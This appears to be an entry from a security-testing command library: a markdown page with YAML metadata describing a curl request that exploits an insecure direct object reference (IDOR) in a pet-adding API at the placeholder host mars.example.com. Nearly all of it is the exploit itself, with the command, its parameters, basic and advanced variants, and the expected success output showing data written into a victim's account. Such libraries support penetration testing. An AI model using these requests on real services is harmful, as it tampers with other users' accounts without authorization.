---
data: >-
  curl -X POST -d '{"owner_id": "VICTIM_USER_ID", "pet_name": "Unauthorized
  Pet", "pet_type": "Dog"}' https://mars.example.com/api/add-pet -H "Cookie:
  session=your_session_cookie" -H "Authorization: Bearer your_token"
tags:
  - http
  - post
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:34.465Z'
id: 458ec97f-e002-4ffc-8afd-2fdf870f0faa
verified: false
validated: true
submitted: true
---
# curl-add-pet-idor

## Command

```bash
curl -X POST -d '{"owner_id": "VICTIM_USER_ID", "pet_name": "Unauthorized Pet", "pet_type": "Dog"}' https://mars.example.com/api/add-pet -H "Cookie: session=your_session_cookie" -H "Authorization: Bearer your_token"
```

## Description

This command uses curl to add a pet to a victim's account via IDOR exploitation on the Mars website's API, by setting the owner_id to an unauthorized value in the JSON payload.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Sets the HTTP method to POST | Yes |
| `-d '{"owner_id": "VICTIM_USER_ID", ...}'` | JSON data with manipulated owner_id and pet details | Yes |
| `https://mars.example.com/api/add-pet` | The pet addition endpoint | Yes |
| `-H "Cookie: session=your_session_cookie"` | Session-based authentication | Yes |
| `-H "Authorization: Bearer your_token"` | API token for authorization | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -d '{"owner_id": "12345", "pet_name": "Test Pet"}' https://mars.example.com/api/add-pet -H "Cookie: session=abc123"
```

### Advanced Usage

```bash
curl -X POST -d '{"owner_id": "12345", "pet_name": "Test Pet", "pet_type": "Cat", "age": 2}' https://mars.example.com/api/add-pet -H "Cookie: session=abc123" -H "Authorization: Bearer tokenxyz" -v
```

## Expected Output

Successful execution returns HTTP 201 Created with {"status": "created", "pet_id": "789"}, indicating the pet was added. Unauthorized attempts without IDOR would fail with 403, but exploitation succeeds.

## Related

- [[Related Procedure: Exploit-IDOR-in-Pet-Addition-Feature]]
